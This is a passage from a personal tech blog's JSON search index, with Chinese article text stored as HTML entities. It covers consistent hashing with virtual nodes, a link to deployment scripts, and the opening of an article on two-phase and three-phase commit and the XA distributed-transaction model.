&#x673A;&#x5668;&#x7684;&#x5220;&#x9664;&#x4E0E;&#x6DFB;&#x52A0;&#x666E;&#x901A;hash&#x6C42;&#x4F59;&#x7B97;&#x6CD5;&#x6700;&#x4E3A;&#x4E0D;&#x59A5;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F;&#x5728;&#x6709;&#x673A;&#x5668;&#x7684;&#x6DFB;&#x52A0;&#x6216;&#x8005;&#x5220;&#x9664;&#x4E4B;&#x540E;&#x4F1A;&#x7167;&#x6210;&#x5927;&#x91CF;&#x7684;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#x5931;&#x6548;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5927;&#x5927;&#x7684;&#x4E0D;&#x6EE1;&#x8DB3;&#x5355;&#x8C03;&#x6027;&#x4E86;&#x3002;&#x4E0B;&#x9762;&#x6765;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x5982;&#x4F55;&#x5904;&#x7406;&#x7684;&#x3002; &#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x7684;&#x5220;&#x9664;&#x4EE5;&#x4E0A;&#x9762;&#x7684;&#x5206;&#x5E03;&#x4E3A;&#x4F8B;&#xFF0C;&#x5982;&#x679C;NODE2&#x51FA;&#x73B0;&#x6545;&#x969C;&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x6309;&#x7167;&#x987A;&#x65F6;&#x9488;&#x8FC1;&#x79FB;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;object3&#x5C06;&#x4F1A;&#x88AB;&#x8FC1;&#x79FB;&#x5230;NODE3&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x4EC5;&#x4EC5;&#x662F;object3&#x7684;&#x6620;&#x5C04;&#x4F4D;&#x7F6E;&#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;&#xFF0C;&#x5176;&#x5B83;&#x7684;&#x5BF9;&#x8C61;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x7684;&#x6539;&#x52A8;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; &#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x7684;&#x6DFB;&#x52A0;&#x5982;&#x679C;&#x5F80;&#x96C6;&#x7FA4;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x8282;&#x70B9;NODE4&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x5E94;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5F97;&#x5230;KEY4&#xFF0C;&#x5E76;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E2D;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; &#x901A;&#x8FC7;&#x6309;&#x987A;&#x65F6;&#x9488;&#x8FC1;&#x79FB;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x90A3;&#x4E48;object2&#x88AB;&#x8FC1;&#x79FB;&#x5230;&#x4E86;NODE4&#x4E2D;&#xFF0C;&#x5176;&#x5B83;&#x5BF9;&#x8C61;&#x8FD8;&#x4FDD;&#x6301;&#x8FD9;&#x539F;&#x6709;&#x7684;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#x3002;&#x901A;&#x8FC7;&#x5BF9;&#x8282;&#x70B9;&#x7684;&#x6DFB;&#x52A0;&#x548C;&#x5220;&#x9664;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5728;&#x4FDD;&#x6301;&#x4E86;&#x5355;&#x8C03;&#x6027;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x8FD8;&#x662F;&#x6570;&#x636E;&#x7684;&#x8FC1;&#x79FB;&#x8FBE;&#x5230;&#x4E86;&#x6700;&#x5C0F;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x7B97;&#x6CD5;&#x5BF9;&#x5206;&#x5E03;&#x5F0F;&#x96C6;&#x7FA4;&#x6765;&#x8BF4;&#x662F;&#x975E;&#x5E38;&#x5408;&#x9002;&#x7684;&#xFF0C;&#x907F;&#x514D;&#x4E86;&#x5927;&#x91CF;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#xFF0C;&#x51CF;&#x5C0F;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7684;&#x538B;&#x529B;&#x3002; &#x5E73;&#x8861;&#x6027;&#x6839;&#x636E;&#x4E0A;&#x9762;&#x7684;&#x56FE;&#x89E3;&#x5206;&#x6790;&#xFF0C;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x6EE1;&#x8DB3;&#x4E86;&#x5355;&#x8C03;&#x6027;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x7279;&#x6027;&#x4EE5;&#x53CA;&#x4E00;&#x822C;hash&#x7B97;&#x6CD5;&#x7684;&#x5206;&#x6563;&#x6027;&#xFF0C;&#x4F46;&#x8FD9;&#x8FD8;&#x5E76;&#x4E0D;&#x80FD;&#x5F53;&#x505A;&#x5176;&#x88AB;&#x5E7F;&#x6CDB;&#x5E94;&#x7528;&#x7684;&#x539F;&#x7531;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD8;&#x7F3A;&#x5C11;&#x4E86;&#x5E73;&#x8861;&#x6027;&#x3002;&#x4E0B;&#x9762;&#x5C06;&#x5206;&#x6790;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x5982;&#x4F55;&#x6EE1;&#x8DB3;&#x5E73;&#x8861;&#x6027;&#x7684;&#x3002;hash&#x7B97;&#x6CD5;&#x662F;&#x4E0D;&#x4FDD;&#x8BC1;&#x5E73;&#x8861;&#x7684;&#xFF0C;&#x5982;&#x4E0A;&#x9762;&#x53EA;&#x90E8;&#x7F72;&#x4E86;NODE1&#x548C;NODE3&#x7684;&#x60C5;&#x51B5;&#xFF08;NODE2&#x88AB;&#x5220;&#x9664;&#x7684;&#x56FE;&#xFF09;&#xFF0C;object1&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE1&#x4E2D;&#xFF0C;&#x800C;object2&#x3001;object3&#x3001;object4&#x90FD;&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE3&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x7167;&#x6210;&#x4E86;&#x975E;&#x5E38;&#x4E0D;&#x5E73;&#x8861;&#x7684;&#x72B6;&#x6001;&#x3002;&#x5728;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x6EE1;&#x8DB3;&#x5E73;&#x8861;&#x6027;&#xFF0C;&#x5176;&#x5F15;&#x5165;&#x4E86;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x3002; &#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#xFF08; virtual node &#xFF09;&#x662F;&#x5B9E;&#x9645;&#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x5728; hash &#x7A7A;&#x95F4;&#x7684;&#x590D;&#x5236;&#x54C1;&#xFF08; replica &#xFF09;&#xFF0C;&#x4E00;&#x5B9E;&#x9645;&#x4E2A;&#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x5BF9;&#x5E94;&#x4E86;&#x82E5;&#x5E72;&#x4E2A;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x5E94;&#x4E2A;&#x6570;&#x4E5F;&#x6210;&#x4E3A;&#x201C;&#x590D;&#x5236;&#x4E2A;&#x6570;&#x201D;&#xFF0C;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x5728; hash &#x7A7A;&#x95F4;&#x4E2D;&#x4EE5;hash&#x503C;&#x6392;&#x5217;&#x3002; &#x4EE5;&#x4E0A;&#x9762;&#x53EA;&#x90E8;&#x7F72;&#x4E86;NODE1&#x548C;NODE3&#x7684;&#x60C5;&#x51B5;&#xFF08;NODE2&#x88AB;&#x5220;&#x9664;&#x7684;&#x56FE;&#xFF09;&#x4E3A;&#x4F8B;&#xFF0C;&#x4E4B;&#x524D;&#x7684;&#x5BF9;&#x8C61;&#x5728;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x5206;&#x5E03;&#x5F88;&#x4E0D;&#x5747;&#x8861;&#xFF0C;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x4EE5;2&#x4E2A;&#x526F;&#x672C;&#xFF08;&#x590D;&#x5236;&#x4E2A;&#x6570;&#xFF09;&#x4E3A;&#x4F8B;&#xFF0C;&#x8FD9;&#x6837;&#x6574;&#x4E2A;hash&#x73AF;&#x4E2D;&#x5C31;&#x5B58;&#x5728;&#x4E86;4&#x4E2A;&#x865A;&#x62DF;&#x8282;&#x70B9;&#xFF0C;&#x6700;&#x540E;&#x5BF9;&#x8C61;&#x6620;&#x5C04;&#x7684;&#x5173;&#x7CFB;&#x56FE;&#x5982;&#x4E0B;&#xFF1A; &#x6839;&#x636E;&#x4E0A;&#x56FE;&#x53EF;&#x77E5;&#x5BF9;&#x8C61;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF1A;object1-&gt;NODE1-1&#xFF0C;object2-&gt;NODE1-2&#xFF0C;object3-&gt;NODE3-2&#xFF0C;object4-&gt;NODE3-1&#x3002;&#x901A;&#x8FC7;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x7684;&#x5F15;&#x5165;&#xFF0C;&#x5BF9;&#x8C61;&#x7684;&#x5206;&#x5E03;&#x5C31;&#x6BD4;&#x8F83;&#x5747;&#x8861;&#x4E86;&#x3002;&#x90A3;&#x4E48;&#x5728;&#x5B9E;&#x9645;&#x64CD;&#x4F5C;&#x4E2D;&#xFF0C;&#x6B63;&#x771F;&#x7684;&#x5BF9;&#x8C61;&#x67E5;&#x8BE2;&#x662F;&#x5982;&#x4F55;&#x5DE5;&#x4F5C;&#x7684;&#x5462;&#xFF1F;&#x5BF9;&#x8C61;&#x4ECE;hash&#x5230;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x5230;&#x5B9E;&#x9645;&#x8282;&#x70B9;&#x7684;&#x8F6C;&#x6362;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; &#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x7684;hash&#x8BA1;&#x7B97;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x5BF9;&#x5E94;&#x8282;&#x70B9;&#x7684;IP&#x5730;&#x5740;&#x52A0;&#x6570;&#x5B57;&#x540E;&#x7F00;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x4F8B;&#x5982;&#x5047;&#x8BBE;NODE1&#x7684;IP&#x5730;&#x5740;&#x4E3A;192.168.1.100&#x3002;&#x5F15;&#x5165;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x524D;&#xFF0C;&#x8BA1;&#x7B97; cache A &#x7684; hash &#x503C;&#xFF1A;Hash(&#x201C;192.168.1.100&#x201D;);&#x5F15;&#x5165;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x540E;&#xFF0C;&#x8BA1;&#x7B97;&#x201C;&#x865A;&#x62DF;&#x8282;&#x201D;&#x70B9;NODE1-1&#x548C;NODE1-2&#x7684;hash&#x503C;&#xFF1A;Hash(&#x201C;192.168.1.100#1&#x201D;); // NODE1-1Hash(&#x201C;192.168.1.100#2&#x201D;); // NODE1-2 &#x603B;&#x7ED3;&#x76EE;&#x524D;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x57FA;&#x672C;&#x6210;&#x4E3A;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x7EC4;&#x4EF6;&#x7684;&#x6807;&#x51C6;&#x914D;&#x7F6E;&#xFF0C;&#x4F8B;&#x5982;Memcached&#x7684;&#x5404;&#x79CD;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x63D0;&#x4F9B;&#x5185;&#x7F6E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x652F;&#x6301;&#x3002;&#x672C;&#x6587;&#x53EA;&#x662F;&#x7B80;&#x8981;&#x4ECB;&#x7ECD;&#x4E86;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#xFF0C;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x53C2;&#x770B;&#x8BBA;&#x6587;&#x300A;Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web&#x300B;&#xFF0C;&#x540C;&#x65F6;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;C&#x8BED;&#x8A00;&#x7248;&#x672C;&#x7684;&#x5B9E;&#x73B0;&#x4F9B;&#x53C2;&#x8003;&#x3002;","raw":null,"content":null,"categories":[{"name":"算法及理论","slug":"算法及理论","permalink":"http://www.wangxin123.com/categories/算法及理论/"}],"tags":[{"name":"分布式算法","slug":"分布式算法","permalink":"http://www.wangxin123.com/tags/分布式算法/"}]},{"title":"自动化部署脚本","slug":"自动化部署脚本","date":"2016-11-12T14:41:19.000Z","updated":"2017-01-09T12:25:32.191Z","comments":true,"path":"2016/11/12/自动化部署脚本/","link":"","permalink":"http://www.wangxin123.com/2016/11/12/自动化部署脚本/","excerpt":"","keywords":null,"text":"&#x6301;&#x7EED;&#x66F4;&#x65B0;&#x4E2D; ~~ &#x5730;&#x5740;&#xFF1A;https://github.com/Wasim37/deployment-scripts/","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"运维","slug":"运维","permalink":"http://www.wangxin123.com/tags/运维/"},{"name":"脚本","slug":"脚本","permalink":"http://www.wangxin123.com/tags/脚本/"}]},{"title":"两阶段提交协议、三阶段提交协议","slug":"两阶段提交协议、三阶段提交协议","date":"2016-11-11T14:10:00.000Z","updated":"2016-11-20T10:45:55.966Z","comments":true,"path":"2016/11/11/两阶段提交协议、三阶段提交协议/","link":"","permalink":"http://www.wangxin123.com/2016/11/11/两阶段提交协议、三阶段提交协议/","excerpt":"&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x901A;&#x5E38;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x7559;&#x591A;&#x4E2A;&#x526F;&#x672C;(replica)&#xFF0C;&#x8FD9;&#x4E9B;&#x526F;&#x672C;&#x4F1A;&#x653E;&#x7F6E;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x3002;&#x4E3A;&#x4E86;&#x5BF9;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x6B63;&#x786E;&#x7684;&#x589E;&#x3001;&#x5220;&#x3001;&#x6539;&#x3001;&#x67E5;&#x7B49;&#x8BED;&#x4E49;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4FDD;&#x8BC1;&#x8FD9;&#x4E9B;&#x653E;&#x7F6E;&#x5728;&#x4E0D;&#x540C;&#x7269;&#x7406;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x526F;&#x672C;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002; &#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x79CD;&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x6027;&#x80FD;&#x548C;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x53CD;&#x53CD;&#x590D;&#x590D;&#x6743;&#x8861;&#x8FC7;&#x7A0B;&#x4E2D;&#x603B;&#x7ED3;&#x4E86;&#x8BB8;&#x591A;&#x5178;&#x578B;&#x7684;&#x534F;&#x8BAE;&#x548C;&#x7B97;&#x6CD5;&#x3002;&#x5176;&#x4E2D;&#x6BD4;&#x8F83;&#x8457;&#x540D;&#x7684;&#x6709;&#x4E8C;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;Two Phase Commitment Protocol&#xFF09;&#x3001;&#x4E09;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;Three Phase Commitment Protocol&#xFF09;&#x548C;Paxos&#x7B97;&#x6CD5;&#x3002; &#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1; &#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x662F;&#x6307;&#x4F1A;&#x6D89;&#x53CA;&#x5230;&#x64CD;&#x4F5C;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5C06;&#x5BF9;&#x540C;&#x4E00;&#x5E93;&#x4E8B;&#x52A1;&#x7684;&#x6982;&#x5FF5;&#x6269;&#x5927;&#x5230;&#x4E86;&#x5BF9;&#x591A;&#x4E2A;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x3002;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7684;&#x5173;&#x952E;&#x662F;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x4E8B;&#x52A1;&#x5728;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x6240;&#x505A;&#x7684;&#x6240;&#x6709;&#x52A8;&#x4F5C;&#xFF0C;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x4E8B;&#x52A1;&#x7684;&#x51B3;&#x5B9A;&#x5FC5;&#x987B;&#x4EA7;&#x751F;&#x7EDF;&#x4E00;&#x7684;&#x7ED3;&#x679C;&#xFF08;&#x5168;&#x90E8;&#x63D0;&#x4EA4;&#x6216;&#x5168;&#x90E8;&#x56DE;&#x6EDA;&#xFF09; &#x5982;&#x679C;&#x60F3;&#x8BA9;&#x5206;&#x5E03;&#x5F0F;&#x90E8;&#x7F72;&#x7684;&#x591A;&#x53F0;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8981;&#x4FDD;&#x8BC1;&#x5728;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x8981;&#x4E0D;&#x5168;&#x90E8;&#x90FD;&#x6267;&#x884C;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x7684;&#x90FD;&#x4E0D;&#x6267;&#x884C;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5728;&#x6267;&#x884C;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x7684;&#x65F6;&#x5019;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x7684;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x3002;&#x6240;&#x4EE5;&#x4ED6;&#x4E5F;&#x5C31;&#x4E0D;&#x77E5;&#x9053;&#x672C;&#x6B21;&#x4E8B;&#x52A1;&#x5230;&#x5E95;&#x5E94;&#x8BE5;commit&#x8FD8;&#x662F; roolback&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5E38;&#x89C4;&#x7684;&#x89E3;&#x51B3;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x5F15;&#x5165;&#x4E00;&#x4E2A;&#x201C;&#x534F;&#x8C03;&#x8005;&#x201D;&#x7684;&#x7EC4;&#x4EF6;&#x6765;&#x7EDF;&#x4E00;&#x8C03;&#x5EA6;&#x6240;&#x6709;&#x5206;&#x5E03;&#x5F0F;&#x8282;&#x70B9;&#x7684;&#x6267;&#x884C;&#x3002;","keywords":null,"text":"&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x901A;&#x5E38;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x7559;&#x591A;&#x4E2A;&#x526F;&#x672C;(replica)&#xFF0C;&#x8FD9;&#x4E9B;&#x526F;&#x672C;&#x4F1A;&#x653E;&#x7F6E;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x3002;&#x4E3A;&#x4E86;&#x5BF9;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x6B63;&#x786E;&#x7684;&#x589E;&#x3001;&#x5220;&#x3001;&#x6539;&#x3001;&#x67E5;&#x7B49;&#x8BED;&#x4E49;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4FDD;&#x8BC1;&#x8FD9;&#x4E9B;&#x653E;&#x7F6E;&#x5728;&#x4E0D;&#x540C;&#x7269;&#x7406;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x526F;&#x672C;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002; &#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x79CD;&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x6027;&#x80FD;&#x548C;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x53CD;&#x53CD;&#x590D;&#x590D;&#x6743;&#x8861;&#x8FC7;&#x7A0B;&#x4E2D;&#x603B;&#x7ED3;&#x4E86;&#x8BB8;&#x591A;&#x5178;&#x578B;&#x7684;&#x534F;&#x8BAE;&#x548C;&#x7B97;&#x6CD5;&#x3002;&#x5176;&#x4E2D;&#x6BD4;&#x8F83;&#x8457;&#x540D;&#x7684;&#x6709;&#x4E8C;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;Two Phase Commitment Protocol&#xFF09;&#x3001;&#x4E09;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;Three Phase Commitment Protocol&#xFF09;&#x548C;Paxos&#x7B97;&#x6CD5;&#x3002; &#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1; &#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x662F;&#x6307;&#x4F1A;&#x6D89;&#x53CA;&#x5230;&#x64CD;&#x4F5C;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5C06;&#x5BF9;&#x540C;&#x4E00;&#x5E93;&#x4E8B;&#x52A1;&#x7684;&#x6982;&#x5FF5;&#x6269;&#x5927;&#x5230;&#x4E86;&#x5BF9;&#x591A;&#x4E2A;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x3002;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7684;&#x5173;&#x952E;&#x662F;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x4E8B;&#x52A1;&#x5728;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x6240;&#x505A;&#x7684;&#x6240;&#x6709;&#x52A8;&#x4F5C;&#xFF0C;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x4E8B;&#x52A1;&#x7684;&#x51B3;&#x5B9A;&#x5FC5;&#x987B;&#x4EA7;&#x751F;&#x7EDF;&#x4E00;&#x7684;&#x7ED3;&#x679C;&#xFF08;&#x5168;&#x90E8;&#x63D0;&#x4EA4;&#x6216;&#x5168;&#x90E8;&#x56DE;&#x6EDA;&#xFF09; &#x5982;&#x679C;&#x60F3;&#x8BA9;&#x5206;&#x5E03;&#x5F0F;&#x90E8;&#x7F72;&#x7684;&#x591A;&#x53F0;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8981;&#x4FDD;&#x8BC1;&#x5728;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x8981;&#x4E0D;&#x5168;&#x90E8;&#x90FD;&#x6267;&#x884C;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x7684;&#x90FD;&#x4E0D;&#x6267;&#x884C;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5728;&#x6267;&#x884C;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x7684;&#x65F6;&#x5019;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x7684;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x3002;&#x6240;&#x4EE5;&#x4ED6;&#x4E5F;&#x5C31;&#x4E0D;&#x77E5;&#x9053;&#x672C;&#x6B21;&#x4E8B;&#x52A1;&#x5230;&#x5E95;&#x5E94;&#x8BE5;commit&#x8FD8;&#x662F; roolback&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5E38;&#x89C4;&#x7684;&#x89E3;&#x51B3;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x5F15;&#x5165;&#x4E00;&#x4E2A;&#x201C;&#x534F;&#x8C03;&#x8005;&#x201D;&#x7684;&#x7EC4;&#x4EF6;&#x6765;&#x7EDF;&#x4E00;&#x8C03;&#x5EA6;&#x6240;&#x6709;&#x5206;&#x5E03;&#x5F0F;&#x8282;&#x70B9;&#x7684;&#x6267;&#x884C;&#x3002; XA&#x89C4;&#x8303;X/Open &#x7EC4;&#x7EC7;&#xFF08;&#x5373;&#x73B0;&#x5728;&#x7684; Open Group &#xFF09;&#x5B9A;&#x4E49;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x6A21;&#x578B;&#x3002; X/Open DTP &#x6A21;&#x578B;&#xFF08; 1994 &#xFF09;&#x5305;&#x62EC;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF08; AP &#xFF09;&#x3001;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x5668;&#xFF08; TM &#xFF09;&#x3001;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; RM &#xFF09;&#x3001;&#x901A;&#x4FE1;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; CRM &#xFF09;&#x56DB;&#x90E8;&#x5206;&#x3002;&#x4E00;&#x822C;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x5668;&#xFF08; TM &#xFF09;&#x662F;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; RM &#xFF09;&#x662F;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x901A;&#x4FE1;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; CRM &#xFF09;&#x662F;&#x6D88;&#x606F;&#x4E2D;&#x95F4;&#x4EF6;&#x3002; 